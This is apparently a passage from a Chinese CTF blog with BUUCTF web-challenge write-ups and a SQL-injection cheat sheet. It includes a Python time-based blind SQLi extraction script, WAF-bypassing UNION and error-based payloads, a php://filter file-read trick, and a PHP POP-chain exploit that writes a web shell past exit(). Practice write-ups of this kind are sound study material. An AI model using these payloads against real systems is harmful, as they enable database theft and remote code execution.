payload_fina=<span class="string">f&quot;1&#x27;or/**/case/**/(select/**/hex(right((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;j&#125;</span>))/**/in/**/(&#x27;<span class="subst">&#123;hex_tran(i)+wd_tr&#125;</span>&#x27;))/**/when/**/1/**/then/**/benchmark(100000,sha1(sha1(sha1(sha1(sha1(sha1(sha1(&#x27;HWG&#x27;))))))))/**/else/**/1/**/end#&quot;</span></span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>:payload_fina</span><br><span class="line">            &#125;</span><br><span class="line">            print(data)</span><br><span class="line">            times=time.time()</span><br><span class="line">            r=s.post(url,data=data).text</span><br><span class="line">            <span class="keyword">if</span> time.time()-times &gt;= <span class="number">4</span>:</span><br><span class="line">                wd_tr=<span class="string">f&quot;<span class="subst">&#123;hex_tran(i)&#125;</span>&quot;</span>+wd_tr</span><br><span class="line">                print(wd_tr)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> i==<span class="number">127</span>:</span><br><span class="line">                wd_tr = tran_str(wd_tr)</span><br><span class="line">                print(wd_tr)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#payload=&quot;database()&quot;</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema in (select database())&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(column_name) from information_schema.columns where table_name in (&#x27;Fl49ish3re&#x27;)&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">    payload=<span class="string">&quot;select group_concat(f1aG123) from Fl49ish3re&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)<span class="comment">#flag&#123;08e687c1-cc68-4db0-9924-407792caf20e&#125;</span></span><br><span class="line">    sql_injection(payload)</span><br></pre></td></tr></table></figure>

<p>但是发现只能打印一部分表的感觉，但是ascii码表都齐了呀–就很奇怪。。。在本地测试了一下，因为我们是十六进制的，所以会出现abcdef这些字母，但是在mysql中 这些字母是大写的，但是在python中的转化结果是小写的，然后我们还使用了binary，区分大小写，所以就跑不出来了，这里我们可以将binary去掉，这样就没关系了</p>
<h4 id="卡壳点"><a href="#卡壳点" class="headerlink" title="卡壳点"></a>卡壳点</h4><p>主要是还是编程能力太弱，还需多加锻炼<br>然后就是那个binary区分大小写的，如果是用字符去注的话就需要区分了，但是这里不是，直接用十六进制就不用了</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/30/buu26/">buu26</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-30</time><div class="content"><h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>burp抓包，发现有参数，尝试一下sql注入，发现为数字型注入，使用union联合注入，字段数为2，并且回显在最后一个位置</p>
<img src="/.com//blog\hexo\source\_posts\buu26\66VL}5HIFD57UN5FBO_WQXW.png" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210730101911.png" alt="img" style="zoom:67%;">

<p>接下来就开始</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">amazonis_planitia%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;&#39;aliens&#39;--+</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210730102943.png" alt="img" style="zoom:50%;">
发现表都是一样的，感觉有点奇怪，于是再回去看看有没有其他库，但是确实只有一个库，看了一下wp发现是要用sqlmap跑一下，有一个code库
然后手工注入一下：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search&#x3D;amazonis_planitia union select group_concat(id),group_concat(code) from alien_code.code--+</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>查看源码，发现一个Unicode，解码以后是一个<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210730111751.png" alt="img" style="zoom:67%;"><br>一开始没反应过来，后来想想，它的意思应该是提示这是一个弱口令<br>跑了一下发现admin/password可以登录<br>登陆以后发现有文件包含，用伪协议尝试读一下源码试试看<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210730112030.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;home</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/upload$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">				$file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				$file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;å½åå¼ç¨çæ¯ &quot;</span>.$file;</span><br><span class="line">			<span class="keyword">require</span> $file;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据过滤内容，应该是有一个名为flag的文件夹存储着flag<br>再来读一下upload.php的文件内0容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">	ä¸ä¼ æä»¶</span><br><span class="line">	&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ä¸ä¼ &quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5($_SESSION[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">		$ext = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (â²â½`ã)&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.$file[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;</span>.$uploader.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>文件+序列化，并且没有反序列化的点，那么就是phar反序列化</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/29/sql%E7%9B%B2%E6%B3%A8%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/">sql盲注深入学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-29</time><div class="content"><h2 id="sql注入语句整理"><a href="#sql注入语句整理" class="headerlink" title="sql注入语句整理"></a>sql注入语句整理</h2><p>这里整理一下绕过了大部分waf的语句</p>
<h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入:"></a><strong>union联合注入:</strong></h3><h4 id="过滤了空格"><a href="#过滤了空格" class="headerlink" title="过滤了空格"></a>过滤了空格</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union&#x2F;*a*&#x2F;select&#x2F;*a*&#x2F;1,group_concat(table_name),3&#x2F;*a*&#x2F;from&#x2F;*a*&#x2F;information_schema.tables&#x2F;*a*&#x2F;where&#x2F;*a*&#x2F;table_schema&#x3D;database()--+</span><br><span class="line">-1&#39;union&#x2F;*a*&#x2F;select&#x2F;*a*&#x2F;1,group_concat(column_name),3&#x2F;*a*&#x2F;from&#x2F;*a*&#x2F;information_schema.columns&#x2F;*a*&#x2F;where&#x2F;*a*&#x2F;table_name&#x3D;&#39;fl4g&#39;--+</span><br><span class="line">-1&#39;union&#x2F;*a*&#x2F;select&#x2F;*a*&#x2F;1,fllllag,3&#x2F;*a*&#x2F;from&#x2F;*a*&#x2F;fl4g--+</span><br></pre></td></tr></table></figure>

<h4 id="过滤了table表"><a href="#过滤了table表" class="headerlink" title="过滤了table表"></a>过滤了table表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union&#x2F;*a*&#x2F;select&#x2F;*a*&#x2F;1,group_concat(table_name),3&#x2F;*a*&#x2F;from&#x2F;*a*&#x2F;sys.schema_auto_increment_columns&#x2F;**&#x2F;where&#x2F;**&#x2F;tabe_schema&#x3D;database()--+</span><br><span class="line">-1&#39;union&#x2F;*a*&#x2F;select&#x2F;*a*&#x2F;1,group_concat(table_name),3&#x2F;**&#x2F;from&#x2F;*a*&#x2F;mysql.innodb_table_stats&#x2F;*a*&#x2F;where&#x2F;*a*&#x2F;database_name&#x3D;database()--+</span><br><span class="line">-1&#39;union&#x2F;*a*&#x2F;select&#x2F;*a*&#x2F;1,fllllag,3&#x2F;*a*&#x2F;from&#x2F;*a*&#x2F;fl4g--+</span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;and&#x2F;**&#x2F;extractvalue(&#39;~&#39;,concat(&#39;~&#39;,database()))--+</span><br><span class="line">1&#39;and&#x2F;**&#x2F;extractvalue(&#39;~&#39;,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tab</span><br><span class="line">les where table_schema&#x3D;database())))--+</span><br><span class="line">1&#39;and&#x2F;**&#x2F;extractvalue(&#39;~&#39;,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)))--+</span><br></pre></td></tr></table></figure>



<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><h3 id="字符串截取问题"><a href="#字符串截取问题" class="headerlink" title="字符串截取问题"></a>字符串截取问题</h3><h4 id="1-substr-substring"><a href="#1-substr-substring" class="headerlink" title="1.substr()/substring()"></a>1.substr()/substring()</h4><p><strong>语法</strong>：<code>substr(str,pos)</code>，截取从pos位置开始到最后的所有str字符串</p>
<p>​            <code>substr(str，pos,len)</code><br>​            <code>substr(str from pos for len)</code><br>​            <code>substr(str from pos)</code></p>
<p><strong>两种等价形式</strong>：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729084755.png" alt="img" style="zoom: 50%;">

<h4 id="2-mid"><a href="#2-mid" class="headerlink" title="2.mid()"></a>2.mid()</h4><p>sql mid()函数用遇得到一个字符串的一部分，这个函数被MYSQL支持，但不被MS SQL Server 和Oracle支持。在SQL Server、Oracle数据库中，我们可以使用SQLsubstring或者sql substr函数作为替代<br>在mysql中和substr基本一样<br><strong>mid必须要三个参数</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729085244.png" alt="img" style="zoom:67%;"></p>
<h4 id="3-right-ascii"><a href="#3-right-ascii" class="headerlink" title="3.right+ascii"></a>3.right+ascii</h4><p><strong>语法：</strong><code>ascii(right(str,pos))</code></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729085921.png" alt="img" style="zoom:67%;">

<h4 id="4-left-reverse-ascii"><a href="#4-left-reverse-ascii" class="headerlink" title="4.left+reverse+ascii"></a>4.left+reverse+ascii</h4><p>left只能显示第一个字符的ascii码，所以每次截取新的出来都需要用reverse翻转更新该ascii码<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210818204109.png" alt="img" style="zoom:67%;"></p>
<h3 id="比较问题"><a href="#比较问题" class="headerlink" title="比较问题"></a>比较问题</h3><h4 id="1-等于"><a href="#1-等于" class="headerlink" title="1.等于"></a>1.等于</h4><h4 id="2-大于小于"><a href="#2-大于小于" class="headerlink" title="2.大于小于"></a>2.大于小于</h4><h4 id="3-like"><a href="#3-like" class="headerlink" title="3.like"></a>3.like</h4><p>sql中like自居使用百分号%字符来表示任意字符，类似于unix或正则表达式中的星号*。<br>如果没有使用百分号%,like字句与等号=的效果是一样的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729090948.png" alt="img" style="zoom:50%;"></p>
<h4 id="4-正则表达式regexp-rlike"><a href="#4-正则表达式regexp-rlike" class="headerlink" title="4.正则表达式regexp rlike"></a>4.正则表达式regexp rlike</h4><p><strong>语法</strong>：<code>regexp &quot;^str&quot;</code> </p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729091454.png" alt="img" style="zoom:67%;">

<p><strong>regexp和rlike是不区分大小写的，需要大小写敏感要加上binary关键字</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729092357.png" alt="img" style="zoom:67%;"></p>
<h4 id="5-between"><a href="#5-between" class="headerlink" title="5.between"></a>5.between</h4><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729093050.png" alt="img" style="zoom:67%;">

<h4 id="6-in"><a href="#6-in" class="headerlink" title="6.in"></a>6.in</h4><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729100242.png" alt="img" style="zoom:67%;">

<p><strong>也是大小写不敏感，字符和数字都可用，也有not in</strong></p>
<h4 id="7-AND逻辑与运算符"><a href="#7-AND逻辑与运算符" class="headerlink" title="7.AND逻辑与运算符"></a>7.AND逻辑与运算符</h4><p>1和真与还是真<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729101041.png" alt="img" style="zoom:50%;"><br>下面的逻辑运算的都一样</p>
<h4 id="8-比较-or逻辑运算符"><a href="#8-比较-or逻辑运算符" class="headerlink" title="8.比较 or逻辑运算符"></a>8.比较 or逻辑运算符</h4><h4 id="9-异或运算符"><a href="#9-异或运算符" class="headerlink" title="9.异或运算符"></a>9.异或运算符</h4><h4 id="10-order-by比较盲注"><a href="#10-order-by比较盲注" class="headerlink" title="10.order by比较盲注"></a>10.order by比较盲注</h4><p><strong>语句：</strong><br>select x union select yzk order by 1; 如果x&lt;y那么排序的第一个会是x，如果x&gt;y那么排序第一个是y，更改的那一瞬间就会发生改变，</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729101744.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729102803.png" alt="img" style="zoom:67%;">

<p>图中表箭头的是可以修改的可以发现布尔值更改的前一个就是真的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729103136.png" alt="img"></p>
<h4 id="11-case"><a href="#11-case" class="headerlink" title="11.case"></a>11.case</h4><p><code>case exp1 when exp2 then exp3 else exp4 end;</code></p>
<p>这个语句的意思是：if exp1==exp2: return exp3<br>else return exp4</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729110429.png" alt="img" style="zoom:67%;">

<h4 id="12-if"><a href="#12-if" class="headerlink" title="12.if"></a>12.if</h4><h4 id="13-trim"><a href="#13-trim" class="headerlink" title="13.trim()"></a>13.trim()</h4><p>trim():删除前后空格、rtrim():删除字符串结尾空格、ltrim():删除字符串起始空格<br><strong>语法：</strong>trim(both/leading/tring 目标字符串 from 源字符串)<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729142333.png" alt="img" style="zoom:50%;"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729142334.png" alt="img" style="zoom:67%;"></p>
<p><strong>利用：</strong><br>可以发现有不一样的回显</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729143024.png" alt="img"></p>
<p>写成比较语句如下：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729143234.png" alt="img"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729143638.png" alt="img" style="zoom:67%;">

<p>如果=号用regexp替代 那么正确的字符一定在regexp前面</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729144338.png" alt="img"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729144416.png" alt="img" style="zoom:67%;"><br>所以应该是正确的那个在后面</p>
<h4 id="14-insert"><a href="#14-insert" class="headerlink" title="14.insert()"></a>14.insert()</h4><p><strong>insert(字符串，起始长度，长度，替换为什么)</strong></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729150500.png" alt="img" style="zoom:67%;">

<p>这样就可以按位截取字符</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/27/buu25/">buu25</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-27</time><div class="content"><h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>找到一个危险函数根据此函数往前看看是否能传值进去这里有个exit()，好像不会执行后面data的内容，这里待会需要想办法绕过，但是首先需要弄懂将值传入的链<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728090038.png" alt="img" style="zoom:50%;"></p>
<p>data首先可能会经过一个压缩的操作为了不让data发生改变，我们就需要将data_compress设为0<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728101551.png" alt="img" style="zoom:67%;"></p>
<p>接下来会经过一个serialize的函数操作，如果为数字，那么就会返回string的data，那我们可以先让我们data会string类型，后面因为serialize()可以看成是一个函数的执行，并且serialize可以由我们直接赋值，这里可以使用strval函数。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728101747.png" alt="img" style="zoom: 67%;"><br>向上是set函数没传入这些值，其中value就是对应我们后面的data<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728103701.png" alt="img" style="zoom:67%;"></p>
<p>往上对应来自于class A中的content中，而这里的store需要赋值为classB中，不然找不到set方法<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728103821.png" alt="img" style="zoom:50%;"></p>
<p>在往上看到来自于cleanContents中的cache，这个在前面的定义中没有看到，所以我们可以直接自己定义一下这个变量，看到下面还有一个json_encode为了防止被json_encode，我们这里还需要将complete设置为0这样子的话就可以避免被json_encode<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728104016.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728104856.png" alt="img" style="zoom: 50%;">

<p>最后再向上来到construct这里，这里有对store进行赋值，这里需要赋值为new B<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210728111306.png" alt="img" style="zoom:67%;"></p>
<p>现在整理一下编写pop链条：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $store;</span><br><span class="line">    <span class="keyword">public</span> $key=<span class="string">&quot;a.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $expire;</span><br><span class="line">    <span class="keyword">public</span> $cache;</span><br><span class="line">    <span class="keyword">public</span> $complete;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store=$store;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options=<span class="keyword">array</span>(<span class="string">&#x27;data_compress&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;expire&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;serialize&#x27;</span>=&gt;<span class="string">&#x27;strval&#x27;</span>);</span><br><span class="line">$a=<span class="keyword">new</span> A($b);</span><br><span class="line">$a-&gt;cache=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="number">1</span>));</span><br><span class="line">$a-&gt;complete=<span class="number">0</span>;</span><br><span class="line">$a-&gt;key=<span class="number">1</span>;</span><br><span class="line">$a-&gt;expire=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现在的难点在于我们写入的内容前面有一个exit()这样的话，我们写入的内容将不会被执行，参考<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a><br>这里介绍的方法是这样的：先使用php://filter/wtrite=convert.base64.decode/resource=./uploads/伪协议，对原本文件中的内容进行base64编码后的读取，除掉那些&lt;?的特殊字符，我们只会对phpexit进行base64编码，我们传入的内容也需要是base64加密，但是我们可以多传入几个字符，打乱前面的加密<br><strong>base64加密方式：</strong><br>第一步，将待转换的字符串每三个字节分为一组，每个字节占8bit，那么共有24个二进制位。<br>第二步，将上面的24个二进制位每6个一组，共分为4组。<br>第三步，在每组前面添加两个0，每组由6个变为8个二进制位，总共32个二进制位，即四个字节。<br>第四步，根据Base64编码对照表（见下图）获得对应的值。反过来，base64解码时，一定是4个有效字节为一组进行解码</p>
<p>所以说这里要跟踪一下content传入的值，可以发现最终传入的值为第一个数组的键值，以及嵌套后的数组的键值<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210729164850.png" alt="img" style="zoom:67%;"><br>拼接以后即变成，因为接下来由于我们使用的伪协议的decode打开，所以前面这些将被base64解密回去，变成乱码 exit就消失了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phpexit111 这里是一句话木马</span><br></pre></td></tr></table></figure>

<p>接下来写一下pop链：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $store;</span><br><span class="line">    <span class="keyword">public</span> $key=<span class="string">&quot;a.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $expire;</span><br><span class="line">    <span class="keyword">public</span> $cache;</span><br><span class="line">    <span class="keyword">public</span> $complete;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store=$store;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 